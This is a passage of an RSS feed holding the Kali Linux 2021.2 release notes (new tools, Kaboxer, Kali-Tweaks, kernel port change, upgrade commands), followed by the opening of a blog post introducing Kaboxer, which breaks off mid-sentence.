<description><p>Say hello to <strong>Kali Linux 2021.2</strong>! This release welcomes a mixture of new items as well as enhancements of existing features, and is ready to be <a href="https://www.kali.org/get-kali/">downloaded <em>(from our updated page)</em></a> <em>or <a href="https://www.kali.org/docs/general-use/updating-kali/">upgraded if you have an existing Kali Linux installation</a></em>.</p> <p>A quick summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2021-1-release/">2021.1 release from February 2021</a> is:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#introducing-kaboxer-v10-again">Releasing Kaboxer v1.0</a></strong> - Introducing Kali Applications Boxer v1.0! Applications in containers</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#releasing-kali-tweaks-v10">Releasing Kali-Tweaks v1.0</a></strong> - Our way to make it easier to configure Kali Linux to your taste</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#refreshed-bleeding-edge-branc">Refreshed Bleeding-Edge branch</a></strong> - We did a complete make over for our backend that produces packages for the latest updates</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#disabled-privileged-ports">Disabled privileged ports</a></strong> - Opening a listener on ports 1024/TCP-UDP and below no longer requires super-user access</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#new-tools-in-kal">New tools added</a></strong> - Ghidra &amp; Visual Studio Code. Along with CloudBrute, Dirsearch, Feroxbuster, pacu, peirates, &amp; Quark-Engine</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#theme-enhancement">Theme enhancements</a></strong> - We added a way to quickly swap between double &amp; one-line terminal prompt and made Xfce4 Quick launch + file manager tweaks</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#desktop-wallpaper--login-background">Desktop wallpaper &amp; login background updates</a></strong> - Default images have changed with more to choose from</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#raspberry-pi-recharged">Raspberry Pi images recharged</a></strong> - RPi 400 fully supported, built-in bluetooth working, &amp; first-run wait time dramatically reduced</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#kali-nethunter-updates">Kali NetHunter support for Android 11</a></strong> - Android 11 support and various other improvements for our NetHunter platform</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#more-docker-supportparallels-supportbug-fixes">More Docker support</a></strong> - Now supporting ARM64 &amp; ARM v7 <em>(along with previous AMD64)</em></li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#more-docker-supportparallels-supportbug-fixes">Parallels support</a></strong> - Kali is fully supported for Apple M1 users who have Parallels</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-2-release/#more-docker-supportparallels-supportbug-fixes">Various bug fixes</a></strong> - Pkexec patched, Wireshark permissions, command-not-found issues, &amp; more accessibility features are all resolved</li> </ul> <hr> <h2 id="introducing-kaboxer-v10-_again_">Introducing Kaboxer v1.0 <em>(Again)</em></h2> <p>In case you missed it, we have previously covered <a href="https://pkg.kali.org/pkg/kaboxer">Kaboxer</a> in it&rsquo;s own <a href="https://www.kali.org/blog/introducing-kaboxer/">dedicated blog post</a>, which goes into a lot more detail of why we love it so! For developers, this is a great new tool in the arsenal. Users will, hopefully, <strong>not realise that they are using it</strong>, only noticing that previously problematic tools now work correctly!</p> <p>Without repeating what has already been posted, this technology allows us to <strong>correctly</strong> package up programs that were previously difficult, with items such as <strong>complex dependencies</strong> or <strong>legacy programs &amp; libraries</strong> <em>(such as <a href="https://www.kali.org/docs/general-use/using-eol-python-versions/">Python 2</a> or dated SSL/TLS)</em>.</p> <p>With Kaboxer&rsquo;s launch, we have released 3 packages using it:</p> <ul> <li><a href="https://pkg.kali.org/pkg/covenant-kbx">Covenant</a> - Daemon using server/client network model</li> <li><a href="https://pkg.kali.org/pkg/firefox-developer-edition-kbx">Firefox (Developer Edition)</a> - Big GUI desktop application</li> <li><a href="https://pkg.kali.org/pkg/zenmap-kbx">Zenmap</a> - Legacy libraries <em>(<a href="https://www.kali.org/docs/general-use/using-eol-python-versions/">Python 2</a>)</em> application</li> </ul> <p>If you want to read more, please see either our <a href="https://www.kali.org/blog/introducing-kaboxer/">blog post</a> covering it, or our <a href="https://www.kali.org/docs/development/packaging-apps-with-kaboxer/">documentation</a> around it.</p> <p><em>Kaboxer is still in its infancy, so please be nice &amp; patient with it.</em></p> <h2 id="releasing-kali-tweaks-v10">Releasing Kali-Tweaks v1.0</h2> <p>Announcing <a href="https://pkg.kali.org/pkg/kali-tweaks">Kali-Tweaks</a>! This is our little helping hand for Kali users, with the idea to help <strong>customize Kali to your own personal taste</strong> quickly, simply, <em>and the correct way</em>. This should help you to <strong>stop doing repetitive tasks</strong>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-2-release/images/kali-tweaks.png'> <img src="https://www.kali.org/blog/kali-linux-2021-2-release/images/kali-tweaks.png" alt="" /> </a> </p> </p> <p>Currently Kali-Tweaks will help out with:</p> <ul> <li><strong>Metapackages</strong> - Installing/removing <a href="https://www.kali.org/docs/general-use/metapackages/">groups of tools</a>, which may not have been available while installing Kali if you did not use the installer image</li> <li><strong>Network Repositories</strong> - Enabling/disabling &ldquo;bleeding-edge&rdquo; &amp; &ldquo;experimental&rdquo; <a href="https://www.kali.org/docs/general-use/kali-branches/">branches</a></li> <li><strong>Shell &amp; Prompt</strong> - Switch between <a href="https://www.kali.org/blog/kali-linux-2020-4-release/">two or one line prompt</a>, enable/disable the extra line before the prompt, or configure <a href="https://www.kali.org/blog/kali-linux-2020-3-release/">Bash or ZSH</a> as the default shell</li> <li><strong>Virtualization</strong> - Using Kali as a <a href="https://www.kali.org/docs/virtualization/">guest VM</a>? Do a few actions to make the experience easier!</li> </ul> <p>Our philosophy is to always <strong>understand what you are running</strong>, before you run it. That way, it reduces the chances of any undesirable nasty surprises. Which is why we will always encourage anyone to do actions <strong>manually before automating</strong> it, so you get to understand what is happening under the hood. On the flip side, we also understand there is so much to remember. Then when you sprinkle in people&rsquo;s bad habits, which often have long term implications and end up breaking Kali, there is room for improvement. So, we started developing Kali-Tweaks. Where possible, Kali-Tweaks will also <strong>display what commands are being executed to help educate users</strong>.</p> <p>We do want to mention a few things:</p> <ul> <li><code>kali-tweaks</code> has been <strong>marked as &ldquo;recommended&rdquo;</strong> rather than &ldquo;required&rdquo;. As a result, if you are upgrading Kali, it <strong>may not be included</strong>. On the other hand, you can remove <code>kali-tweaks</code> without removing anything else</li> <li>On the subject of upgrading; depending on how old your Kali installation is, you may need to <strong>reset your shell resource</strong> <em>(e.g. <code>.bashrc</code> &amp; <code>.zshrc</code>)</em> before you can use the &ldquo;configure prompt&rdquo; section. This is because it will not have the necessary variables. Should you want to, make sure to <strong>backup, reset, and restore</strong></li> <li>The last thing to point out, when changing the default login shell; please <strong>log out and in again</strong> <em>(either graphically or remote console)</em> for it to have an effect</li> </ul> <p>It is still early days with Kali-Tweaks, and we already have ideas of what to expand into, but we welcome <a href="https://gitlab.com/kalilinux/packages/kali-tweaks/-/issues">any suggestions from you</a>!</p> <p><em>Kali-Tweaks is still in its infancy, so please be nice &amp; patient with it.</em></p> <h2 id="refreshed-bleeding-edge-branch">Refreshed Bleeding-Edge Branch</h2> <p>Kali&rsquo;s Bleeding-Edge branch has been around since <a href="https://www.kali.org/blog/bleeding-edge-kali-repositories/">March 2013</a>, but we have recently completely <strong>restructured the backend</strong>.</p> <p>For those not too familiar with Bleeding-Edge branch, here is a breakdown:</p> <ul> <li>Kali by default opts to be <strong>stable where possible when packaging</strong>. This means some tools may <strong>appear</strong> to be &ldquo;out-dated&rdquo;</li> <li>We do this by looking to see when the <strong>tool author(s) signals</strong> &ldquo;everything up to to this point is good&rdquo;, by doing a &ldquo;<strong>point release</strong>&rdquo; <em>(e.g. <code>1.0</code> or <code>2.1</code>)</em></li> <li>Developers often use <strong>source-code version control</strong>, allowing them to track any changes</li> <li>How programmers use source-code version control depends on <strong>their work flow, experience, and team size</strong> <ul> <li>Developers can use a <strong>&ldquo;tag&rdquo; feature</strong> found in most source-code version control to signal when there is a new version <em>(this is what Kali prefers)</em></li> <li>However, some people may say <strong>if it makes it to &ldquo;master&rdquo; or &ldquo;main&rdquo; branch</strong>, then it is &ldquo;production ready&rdquo;</li> </ul> </li> <li>There are times where <strong>it has been &ldquo;a while&rdquo;</strong> <em>(months or even years)</em> <strong>since doing a tag</strong> for a stable release <em>(aka point release)</em>, and people get frustrated that there are no updates <em>(e.g. <a href="https://pkg.kali.org/pkg/hashcat">hashcat</a> or <a href="https://pkg.kali.org/pkg/impacket">impacket</a>)</em>. <ul> <li>In other cases, <strong>you want the latest code</strong> which may include an exploit 0day <em>(e.g. <a href="https://pkg.kali.org/pkg/metasploit-framework">Metasploit-framework</a>, <a href="https://pkg.kali.org/pkg/powershell-empire">Empire</a>, or <a href="https://pkg.kali.org/pkg/exploitdb">Exploit-DB</a>)</em> so waiting for a tag release may <strong>not be an option</strong></li> </ul> </li> </ul> <p>You may then end up skipping the Kali package and compiling your favorite tool&rsquo;s source-code. This might then conflict with Kali&rsquo;s packaging, and it is your responsibility to maintain the program. <strong>This is where bleeding-edge branch comes in.</strong></p> <p>Since <a href="https://www.kali.org/blog/kali-linux-roadmap-2019-2020/">moving over to GitLab</a>, we have been able to create <a href="https://www.kali.org/docs/development/leveraging-the-kali-bot/">Kali-Bot</a> to help with <strong>heavy lifting and automation</strong></p> <ul> <li>Automatically package <strong>tag&rsquo;d releases</strong> to kali-<strong>experimental branch</strong></li> <li>Automatically package the <strong>last commit</strong> to kali-<strong>bleeding-edge branch</strong></li> </ul> <p>This is a fully automated procedure, as a result, the testing that goes into our packaging is automated as well <em>(unlike anything that is in kali-rolling branch which has manual testing involved)</em>. If there has not been a unit test created, its not going to be tested for. This means there is <strong>a chance</strong> packages will be broken, and more trust goes into the tool author having correctly developed the tool.</p> <p>If you want to give it a try, have a look at our <strong><a href="https://www.kali.org/docs/general-use/kali-bleeding-edge/">kali-bleeding-edge documentation</a> to learn how to enable</strong> the repository and how to tell apt to select a package from this repository. <strong>Once the repository has been enabled</strong>, it looks like this:</p> <pre><code class="language-console">kali@kali:~$ dpkg -l \ | grep ffuf ii ffuf 1.3.1-0kali1 amd64 Fast web fuzzer written in Go (program) kali@kali:~$ kali@kali:~$ sudo apt install -y ffuf/kali-bleeding-edge ... kali@kali:~$ kali@kali:~$ dpkg -l \ | grep ffuf ii ffuf 1.3.1+git20210505.1.f032167-0kali1~jan+nus1 amd64 Fast web fuzzer written in Go (program) kali@kali:~$ </code></pre> <p>Not every tool has made it to the new system yet as there are still many limitations to overcome, but to see what is supported and also how many:</p> <pre><code class="language-console">kali@kali:~$ curl -s -L 'http://http.kali.org/kali/dists/kali-bleeding-edge/main/binary-amd64/Packages' \ | awk -F ': ' '/^Package: /{print $2}' ... kali@kali:~$ kali@kali:~$ curl -s -L 'http://http.kali.org/kali/dists/kali-bleeding-edge/main/binary-amd64/Packages' \ | awk -F ': ' '/^Package: /{print $2}' \ | wc -l 78 kali@kali:~$ kali@kali:~$ curl -s -L 'http://http.kali.org/kali/dists/kali-experimental/main/binary-amd64/Packages' \ | awk -F ': ' '/^Package: /{print $2}' \ | wc -l 192 kali@kali:~$ kali@kali:~$ curl -s -L 'http://http.kali.org/kali/dists/kali-rolling/main/binary-amd64/Packages' \ | awk -F ': ' '/^Package: /{print $2}' \ | wc -l 59518 kali@kali:~$ </code></pre> <p>The numbers will only grow bigger and better as time goes on, with less bugs in the code and more unit tests in place!</p> <p>If you are a tool author and want to get your software on the list, please <a href="https://forums.kali.org/">chat to us</a>, and we can show how to <a href="https://www.kali.org/docs/development/leveraging-the-kali-bot/">enable webhooks</a>!</p> <h2 id="disabled-privileged-ports">Disabled Privileged Ports</h2> <p>We have patched <strong>our kernel to remove the restriction</strong> of requiring privilege permission in order to use <strong>TCP &amp; UDP ports under 1024</strong> <em>(meaning 0/TCP-UDP &lt;= 1023/TCP-UDP)</em>. This was done because:</p> <ul> <li>We see Kali as a <strong>desktop OS</strong>, rather than a server</li> <li>This &ldquo;well-known&rdquo; privileged port range is reserved for <strong>server services</strong> <em>(e.g. 80/TCP HTTP, 443/TCP HTTPS)</em></li> <li>With the switch from Kali&rsquo;s <a href="https://www.kali.org/blog/kali-default-non-root-user/">root to non-root user by default</a>, <strong>rather than doing a port forward</strong> from outside the privilege ports to a restricted port, people were just <strong>running the program with super-user permissions instead</strong> <ul> <li>We get it. It&rsquo;s quicker to run: <code>$ sudo &lt;program&gt;</code>,</li> <li>Rather than remembering something like: <code>$ sudo iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8888</code></li> <li>It also can get complex and confusing with a lot of redirects setup in place</li> <li><em>Alternatively people were using <code>authbind</code> to allow certain users to use certain ports</em></li> </ul> </li> <li>This <strong>defeats the point of switching to non-root user</strong>! <ul> <li><em>Let&rsquo;s reduce any possible attack surface!</em></li> </ul> </li> </ul> <p>Now, this change won&rsquo;t appear in all instances as some flavors of Kali operate without our kernel. This depends on which platform you use <em>(such as Cloud instances, Docker or WSL)</em>. If you are on a platform that does not use our customized Kernel, this change will not be applied. For example, the top one uses Kali&rsquo;s kernel on a bare metal install, and below uses Kali in a docker container, so its using the host&rsquo;s kernel:</p> <pre><code class="language-console">kali@kali:~$ uname -r 5.10.0-kali7-amd64 kali@kali:~$ ...vs... $ docker run --rm --interactive --tty kalilinux/kali-rolling:latest uname -r 5.10.25-linuxkit $ </code></pre> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what&rsquo;s been added <em>(to Kali&rsquo;s archive and network repositories)</em>:</p> <ul> <li><a href="https://pkg.kali.org/pkg/cloudbrute">CloudBrute</a> - Find a company infrastructure, files, and apps on the top cloud providers</li> <li><a href="https://pkg.kali.org/pkg/dirsearch">Dirsearch</a> - Brute force directories and files in web servers</li> <li><a href="https://pkg.kali.org/pkg/feroxbuster">Feroxbuster</a> - Simple, fast, recursive content discovery</li> <li><a href="https://pkg.kali.org/pkg/ghidra">Ghidra</a> - Reverse engineering framework</li> <li><a href="https://pkg.kali.org/pkg/pacu">Pacu</a> - AWS exploitation framework</li> <li><a href="https://pkg.kali.org/pkg/peirates">Peirates</a> - Kubernetes penetration</li> <li><a href="https://pkg.kali.org/pkg/quark-engine">Quark-Engine</a> - Android malware scoring system</li> <li><a href="https://pkg.kali.org/pkg/code-oss">VSCode</a> <em>a.k.a. Visual Studio Code Open Source (&ldquo;Code-OSS&rdquo;)</em> - Code editor</li> </ul> <p><strong>Ghidra</strong> and <strong>VSCode</strong> have been included into the <code>kali-linux-large</code> <a href="https://www.kali.org/docs/general-use/metapackages/">metapackage</a>, so they are <strong>included on the installer image</strong> for people doing a fresh install. Otherwise you will need to upgrade Kali <em>(if you already have the <strong>kali-linux-large</strong> install)</em> or manually install them <em>(if you want them!)</em>:</p> <pre><code class="language-console">kali@kali:~$ sudo apt update &amp;&amp; sudo apt install -y ghidra code-oss </code></pre> <p>A few notes about <code>code-oss</code> <em>(aka <strong>VSCode</strong>)</em>:</p> <ul> <li>We are <strong>compiling this from <a href="https://gitlab.com/kalilinux/packages/code-oss">source</a></strong>, rather than using the pre-built binaries <ul> <li>The upside to this is that <a href="https://code.visualstudio.com/docs/getstarted/telemetry"><strong>telemetry data is disabled</strong> by default</a></li> <li>The downside is that <strong>some aspects of the marketplace may not work</strong>. If you find these limitations a problem, you may wish to uninstall the Kali package and switch to the VSCode pre-built binaries</li> </ul> </li> <li>You also may question <strong>why it was named <code>code-oss</code></strong>, rather than <code>code</code> <ul> <li>Code-OSS is what the <a href="https://github.com/microsoft/vscode/blob/8f11975c47c9d97b3248e14caf9f7bc4c372d84f/src/vs/platform/product/common/product.ts#L60">source-code</a> <strong>calls <a href="https://github.com/microsoft/vscode/blob/8f11975c47c9d97b3248e14caf9f7bc4c372d84f/product.json#L4">itself</a></strong>, which is used as the base before the configurations are applied for the pre-compiled binaries that gets distributed as &ldquo;code&rdquo;</li> <li>As we are using the source-code, we used the variables defined by it</li> <li>The <strong>two different names help to distinguish the differences</strong> between them <em>(also prevents any clashes and conflicts!)</em></li> <li>We also <strong>included various aliases in our package</strong> to help bridge between the two different versions. Meaning, calling <strong><code>vscode</code> and <code>code</code></strong> will <strong>use our package</strong>, <code>code-oss</code>, with a friendly notice <em>(when installed)</em></li> </ul> </li> <li>If you already have the pre-compiled version installed, <strong>upgrading Kali</strong> will <strong>not replace it</strong> <ul> <li>However, when <strong>manually installing</strong> <code>code-oss</code>, it will then <strong>replace</strong> it!</li> </ul> </li> </ul> <h2 id="theme-enhancement">Theme Enhancement</h2> <h3 id="command-line">Command Line</h3> <p>If you are using ZSH, with the latest Kali profile applied, you can <strong>toggle between the two-line prompt and one-line prompt</strong> by pressing: <strong><code>CTRL</code> + <code>p</code></strong> <em>(at the same time)</em>. This will only have an effect for the <strong>current session</strong>. If you would like to set it <strong>permanently, see <code>kali-tweaks</code></strong>.</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/kali-linux-2021-2-release/videos/cli-toggle-prompt.mp4" > Your browser does not support the video tag. </video> <h3 id="xfc4">Xfc4</h3> <p>We have switched up the <strong>quick launch tray</strong> in the top left, by:</p> <ul> <li>Dropping the <strong>screen recorder</strong> button <em>(as a result package can also be removed, <code>kazam</code>)</em></li> <li>Adding a <strong>text editor</strong> shortcut (this uses <code>mousepad</code> as it is a quick and light)_ <ul> <li><em>If you are looking for something that is more substantial, try <code>code-oss</code></em></li> </ul> </li> <li>Adding in a <strong>web browser</strong> icon, which starts the default browser <em>(often <code>FireFox</code>)</em></li> <li>Adding a drop-down menu to select the <strong>user for default terminal</strong> <em>(<code>terminal</code> or <code>root terminal</code> &amp; Kali&rsquo;s default is <code>QTerminal</code>)</em></li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-2-release/images/cli-tray.png'> <img src="https://www.kali.org/blog/kali-linux-2021-2-release/images/cli-tray.png" alt="" /> </a> </p> </p> <p>To give you an idea of how the toggling between the <strong>terminal user</strong> works:</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/kali-linux-2021-2-release/videos/cli-toggle-terminal.mp4" > Your browser does not support the video tag. </video> <hr> <p>Inside of <code>Thunar</code> <em>(Xfce&rsquo;s default <strong>file manager</strong>)</em>, if you right-click in the main window, you should have a new option, <strong>Open as Root</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-2-release/images/cli-thunar.png'> <img src="https://www.kali.org/blog/kali-linux-2021-2-release/images/cli-thunar.png" alt="" /> </a> </p> </p> <hr> <p>With these theme changes, you <strong>may not get them if you upgrade</strong> Kali. This is because the <strong>theme settings</strong> are <strong>copied</strong> to your <strong>home folder</strong> when your <strong>user is first created</strong>. When you upgrade Kali, it is <strong>upgrading the operating system</strong>, so upgrading <strong>does not alter personal files</strong> <em>(just system files)</em>. As a result, in order to get these theme tweaks, you need to either:</p> <ul> <li>Do a fresh Kali install</li> <li>Create a new user and switch to that</li> <li>Delete your Xfce profile for the current user and force reboot</li> </ul> <pre><code class="language-console">kali@kali:~$ mv ~/.config/xfce4{,-$(date +%Y.%m.%d-%H.%M.%S)} kali@kali:~$ mv ~/.config/qterminal.org{,-$(date +%Y.%m.%d-%H.%M.%S)} kali@kali:~$ mv ~/.config/qt5ct{,-$(date +%Y.%m.%d-%H.%M.%S)} kali@kali:~$ mv ~/.config/Thunar{,-$(date +%Y.%m.%d-%H.%M.%S)} kali@kali:~$ kali@kali:~$ cp -rbi /etc/skel/. ~ kali@kali:~$ kali@kali:~$ xfce4-session-logout --reboot --fast </code></pre> <h4 id="desktop-wallpaper--login-background">Desktop Wallpaper &amp; Login Background</h4> <p>People who have upgraded, you may have spotted that there is a new <strong>default login wallpaper and desktop background</strong>, but there are extras as well in this release:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-2-release/images/wallpapers.png'> <img src="https://www.kali.org/blog/kali-linux-2021-2-release/images/wallpapers.png" alt="" /> </a> </p> </p> <p>Whilst on the subject of wallpapers, if you have not noticed, previously we had been operating on an refresh cycle about <strong>every 6 months</strong>, where we would change the default login and desktop as well as included other art work if they were not to your taste. Going forwards, we are aiming to <strong>change the defaults at every 20xx.1 release</strong> <em>(meaning it happens right at the start of every year)</em>. <em>So it will still change again in 6 months, but this will be the last time!</em> We will still aim to <strong>add extra wallpapers every 6 months</strong>, however, only <strong>change the defaults yearly</strong>.</p> <p>Finally, we have updated <code>kali-community-wallpapers</code> &amp; <code>kali-wallpapers-legacy</code> packages as well!</p> <h2 id="raspberry-pi-recharged">Raspberry Pi Recharged</h2> <p>Two new packages:</p> <ul> <li><a href="http://pkg.kali.org/pkg/kalipi-config">kalipi-config</a> - <strong><code>raspi-config</code> on steroids</strong> to assist in the initial setup of Kali Linux on a Raspberry Pi</li> <li><a href="http://pkg.kali.org/pkg/kalipi-tft-config">kalipi-tft-config</a>- assist in the <strong>initial setup of TFT displays</strong> on a Raspberry Pi</li> </ul> <p>And other improvements:</p> <ul> <li>Got built-in Bluetooth working on Raspberry Pi 4 &amp; Raspberry Pi 400 <em>(meaning <strong>all Raspberry Pi&rsquo;s built-in bluetooth work</strong>!)</em> <ul> <li><em>This is due to <code>bluez</code>, <code>bluez-firmware</code>, and <code>pi-bluetooth</code> packages forked and patched</em></li> </ul> </li> <li>Raspberry Pi kernel updated to <strong>5.4.83</strong></li> <li><strong>mt76 devices</strong> now work on Raspberry Pi 2 and 3 if you pass the option <code>disable_usb_sg=1</code> when loading the <code>mt76_usb</code> module</li> <li><strong>1500%</strong> performance improvement</li> <li>First boot from <strong>20 minutes to 15 seconds</strong></li> <li><strong>Console scrolling</strong> working</li> </ul> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p>Plenty of improvements under the hood, including:</p> <ul> <li>Improved compatibility with <strong>dynamic partitions</strong></li> <li>Improvements to persistence of <strong>Magisk root</strong></li> <li>Improvements to <strong>Bluetooth and settings menus</strong></li> <li>Inclusion of <code>rtl88xxau</code> <strong>patches for older kernels</strong> in the kernel builder</li> </ul> <p>And the highlight:</p> <p><strong>Android 11</strong> support for:</p> <ul> <li>Nokia 6.1</li> <li>OnePlus Nord</li> <li>OnePlus One</li> <li>Samsung Galaxy S20 FE 5G</li> <li>Xiaomi Mi A3</li> <li>Xiaomi Poco F1</li> </ul> <p>The Kali NetHunter repository now contains <strong><a href="https://nethunter.kali.org/kernel-stats.html">179 kernels</a></strong> for <strong><a href="https://nethunter.kali.org/imagestats.html">72 devices</a></strong> and <strong>32 pre-built images</strong> are available on our <a href="https://www.kali.org/kali-nethunter/">download page</a></p> <p>Huge thanks to <a href="https://gitlab.com/kimoc0der">@kim0coder</a>, <a href="https://gitlab.com/yesimxev">@yesimxev</a>, <a href="https://gitlab.com/Svirusx">@Svirusx</a>, <a href="https://gitlab.com/Martinvlba">@Martinvlba</a>, <a href="https://gitlab.com/CaliBerrr">@CaliBerrr</a>, <a href="https://gitlab.com/maade69">@maade69</a> and the entire Kali NetHunter community for making this release happen. <strong>You absolutely rock</strong>!</p> <h2 id="more-docker-supportparallels-supportbug-fixes">More Docker support/Parallels support/Bug fixes</h2> <p>There are even more improvements to Kali, that are outside of the above text. Below are other note-worthy items:</p> <ul> <li>Our <a href="https://hub.docker.com/r/kalilinux/kali-rolling/tags"><strong>Kali-Docker</strong> images</a> are now available for <strong>arm64 and armhf</strong> as well as <strong>amd64</strong></li> <li>We have patched <code>pkexec</code>, so now <strong>Qt applications</strong> which have been ran as <strong>root</strong> will <strong>maintain the dark theme and the HiDPI setting</strong></li> <li>On a fresh Kali install, <code>wireshark</code> can now be run by <strong>unprivileged users</strong></li> <li>A couple of <strong>bugs were fixed in <a href="https://www.kali.org/blog/kali-linux-2021-1-release/">command-not-found</a></strong>, which is the terminal helper that helps you installing missing programs</li> <li><strong>Accessibility features were not installed by default</strong> <em>(this was a mistake on our side that is now fixed)</em></li> <li>Fixed a <strong>terminal font issue with special characters</strong></li> <li><strong>Apple M1 users, <a href="https://kb.parallels.com/en/124805">Parallels</a></strong> is no longer in &ldquo;Technical Preview&rdquo; and as part of the release, they&rsquo;ve fixed Kali image detection.</li> <li><code>Win-KeX</code> v2.10 has been released which now <strong>supports multiscreen</strong></li> <li>Kali&rsquo;s logo is now included in the <a href="https://www.nerdfonts.com/">nerd-fonts</a> project, so, with their next release you&rsquo;ll be able to <strong>customize your terminal with the dragon</strong>. If you want to try it now, we&rsquo;ve created a <a href="fonts/Fira-Code-Regular-Nerd-Font-Complete.ttf">patched Fira-Code font</a> with these new changes <em>(the code for the logo is <code>\uF32B</code>)</em></li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-2-release/images/nerd-fonts-kali.png'> <img src="https://www.kali.org/blog/kali-linux-2021-2-release/images/nerd-fonts-kali.png" alt="" /> </a> </p> </p> <hr> <h2 id="download-kali-linux-20212">Download Kali Linux 2021.2</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">grabbing Kali</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead.</p> <p>This way you&rsquo;ll have fewer updates to do.</p> <p><em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade +--(kali?kali)-[~] +-$ for x in xfce4 qterminal.org qt5ct Thunar; do mv ~/.config/$x{,-$(date +%Y.%m.%d-%H.%M.%S)}; done +--(kali?kali)-[~] +-$ cp -rbi /etc/skel/. ~ +--(kali?kali)-[~] +-$ sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2021.2. We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2021.2&quot; VERSION_ID=&quot;2021.2&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP Debian 5.10.28-1kali1 (2021-04-12) +--(kali?kali)-[~] +-$ uname -r 5.10.0-kali7-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We&rsquo;ll never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p></description>
</item>
<item>
<title>Kaboxer - Kali Applications Boxer</title>
<link>https://www.kali.org/blog/introducing-kaboxer/</link>
<guid isPermaLink="true">https://www.kali.org/blog/introducing-kaboxer/</guid>
<pubDate>Tue, 25 May 2021 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/introducing-kaboxer/images/kaboxer-banner-v1.jpg" type="image/jpg"/>
<description><p>On and off for the last 18 months we have been working on <strong>Kaboxer</strong>, and just before Kali 2021.1, it is ready to say &ldquo;Hello World&rdquo; <em>(then it will start shipping you applications)</em>.</p> <h2 id="tldr---what-is-this">TL;DR - What is this?</h2> <p><strong>What is the name about, Kaboxer?</strong> Kali Applications Boxer</p> <p><strong>What does that mean?</strong> Apps in containers, for packages (a way forward for applications that are hard to package properly). But instead of being stand alone containers, they are integrated into the standard Kali package management systems and can be installed/removed through standard apt commands.</p> <p><strong>Okay. But what does Kaboxer do?</strong> Not every tool is easy to package. There are various criteria to meet, at times some crazy dependency trees or peculiar system modifications. You may need to use a legacy library, or you may need to change a configuration of something that would break another application. What do you do? We work with tool authors to try and make it easier, or we spend many late nights trying to get it to fit or we are just unable to package it.</p> <p>Enter Kaboxer. Using containers we can put in complex non-standard package into a container and integrate it with the rest of the operating system, and bundle it up into the packaging eco-system. This means you can apt-install a Kaboxer program and use it without needing to take any special steps.</p> <p><strong>How does Kaboxer benefit me?</strong> Kaboxer has a few use-cases, depending on who is using it:</p> <ul> <li>For people using Kali Linux, it is transparent so you will not notice when you are using it <em>(which is why you may not see it as &ldquo;a big deal&rdquo;)</em>. You just get more tools!</li> <li>For us Kali developers, this is a game changer.</li> <li>For other Debian packagers, <a href="https://www.kali.org/docs/development/packaging-apps-with-kaboxer/">this may pique your attention</a>.</li> <li>For tool authors <em>(who want their software in Kali)</em>, there is hope for you yet ;-)</li> </ul> <p><strong>What&rsquo;s the down side to Kaboxer?</strong> The size of the application will be larger because it will carry the normal overhead of having to use containers. While the installed package will be small, its installation will download the required container which will consume up to several hundreds of megabytes even for a simple application.</p> <p><strong>What is going to happen because of Kaboxer?</strong> We hope to start to include more tools into Kali Linux that were previously not packable, and have you not realize that you are using them via Kaboxer. Unfortunately, such tools will not make it into our default installation as the size increase for the ISO images would be too significant.</p> <hr> <h2 id="overview">Overview</h2> <p>There are various tools which would be a benefit to Kali users, but suffer from problems that make them hard to ship properly as 